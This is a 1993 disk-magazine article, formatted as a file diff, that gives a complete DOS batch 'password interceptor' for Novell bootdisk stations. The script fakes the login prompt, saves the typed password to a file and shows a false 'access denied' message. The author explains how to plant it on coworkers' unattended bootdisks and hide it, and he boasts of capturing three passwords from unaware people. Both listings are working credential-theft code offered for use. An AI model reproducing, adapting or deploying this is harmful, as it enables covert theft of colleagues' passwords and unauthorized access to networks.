@@ -1,0 +1,159 @@
+PASSWORD HACK
+
+==============================================================================
+                  
+                      PASSWORD INTERCEPTOR IN DOS
+                            - by Slimer -
+
+==============================================================================
+
+
+Only for Novell and stations that use a bootdiskette      ~KEY.BL2~
+****************************************************
+It doesn't properly work with Ethernet !
+****************************************
+
+There are many ways to get a password but I think that there isn't a
+more easier way then the simple piece of code in this article.
+If you have a PC on a Novell network that needs a bootdisk then this is
+the ideal program to snatch the password of somebody else.
+
+At my work we use an outdated system called ARCnet but if you want to use 
+the small "interceptor" with another system (Ethernet or so) you probably
+have to alter the code a bit.
+
+My personal expierence is that most users always let the bootdisk floating
+around the office or have it lying in their drawer.  
+It's not hard to get hold of their bootdisk, maybe you even use eachothers
+bootdisk then it's even more easy !
+
+EXPLANATION
+***********
+The program works very simple, it fakes the login procedure and writes the
+password to disk.
+When you type in your password you sometimes make a type mistake and get
+thrown out of the procedure !
+The program lets you think that you made a typing mistake while it catches
+your password.
+   
+Don't worry the program is tested on several people and it worked like a
+charm.
+Those people knew nothing about it, I managed to obtain 3 passwords this way.
+
+The listing below is the original version of the program.
+I will explain what happens step by step with remarks, you will also find
+a version without the remarks in this article.
+People who know Dos should have no problems at all with it(it's simple) !
+
+I made also an auto install program which installs the interceptor on the
+disk but only I use that one.
+The code used in the install program is changed for a faster performance !
+
+One final remark: the program doesn't work without the program "WHAT" which
+must also be installed on the disk ( WHAT.EXE can be found in the program
+folder on this disk, just copy it to a MS-Dos formatted disk ).
+
+REMOVE write protect for use !
+******
+
+THE CODE WITH REMARKS,                               ~KEY.BL2~
+**********************
+
+@echo off
+REM * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+REM          A SIMPLE PASSWORD -INTERCEPTOR- CODED IN DOS !
+REM          ==============================================
+REM          V.2.0 (C)ODERIGHT 1993 BY SLIMER OF THE D.B.A.
+REM                           FOR
+REM          EUROPE'S NO.1 DISKMAGAZINE FOR THE ATARI FALCON
+REM
+REM          PLEASE REMOVE ALL REM(ARKS) BEFORE EXECUTION
+REM * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+del a:\autoexec.bat
+REM erase the original autoexec.bat from disk
+echo @echo off>> a:\autoexec.bat
+echo ipx>> a:\autoexec.bat
+echo net3>> a:\autoexec.bat
+echo prompt $p$g>> a:\autoexec.bat
+echo f:>> a:\autoexec.bat
+echo login server/>> a:\autoexec.bat
+REM The previous lines writes a new autoexec.bat to disk
+REM After you boot again everything will work normally ! 
+what s "Enter your login name:"
+what SE "Enter your password:"
+REM Fake login procedure !
+set what=%what%
+REM Catch password in string
+echo Access to server denied and you have been logged out.
+echo You are attached to server SERVER.
+REM Fake logout procedure 
+echo %what%>> a:\catch.bat
+REM Write the string into the catch.bat on disk 
+prompt $p$G
+F:\
+set what=
+REM Reset string and go to the F:\drive
+
+ACTUAL CODE WITHOUT THE REMARKS,
+**********************************
+
+@echo off
+del a:\autoexec.bat
+echo @echo off>> a:\autoexec.bat
+echo ipx>> a:\autoexec.bat
+echo net3>> a:\autoexec.bat
+echo prompt $p$g>> a:\autoexec.bat
+echo f:>> a:\autoexec.bat
+echo login server/>> a:\autoexec.bat
+what s "Enter your login name:"
+what SE "Enter your password:" 
+set what=%what%
+echo Access to server denied and you have been logged out.
+echo You are attached to server SERVER.
+echo %what%>> a:\catch.bat
+prompt $p$G
+F:\
+set what=
+
+The "interceptor" is only 17 lines, as you may have noticed it looks very 
+much like a basic listing.
+DOS doesn't know the command WHAT, this command can only be used when you
+copy the little program called WHAT.EXE to the root dir. of your Hard-disk 
+or boot disk. 
+The little program gives you a couple of extra features within DOS !
+WHAT.EXE has many more features, you just have type <WHAT> to see
+a list of these features.
+
+To make the interceptor program work is to copy it to the bootdisk and change 
+the autoexec.bat like this,
+
+@echo off
+IPX
+NET3 (or higher)
+Prompt $p$g
+A:\pass.bat      <----(simple hey)
+
+This will do the trick.......
+
+If you have Norton Commander then you can hide the "interceptor" on the
+disk, that makes chance of discovery very small.
+
+SOME LAST WORDS
+***************
+
+It is possible that the "interceptor" doesn't work properly on your system,
+you are ofcourse free to alter the code.
+The program is only made to give you an idea(!) how simple such a Dos 
+"interceptor" can be coded.
+As I said before the WHAT program can be found on the D.B.A. magazine disk.
+
+When you use this program, it will be at your own risk because we don't take
+any responsibility for your actions.
+The "interceptor" is only coded to show everybody that you don't have to go
+to enormous efforts to get the password of somebody else.
+  
+The people of the automation department at my work thought it was rather
+amazing when they saw the simplicity of it.
+I won't mention what they said when they saw it actually work ! 
+
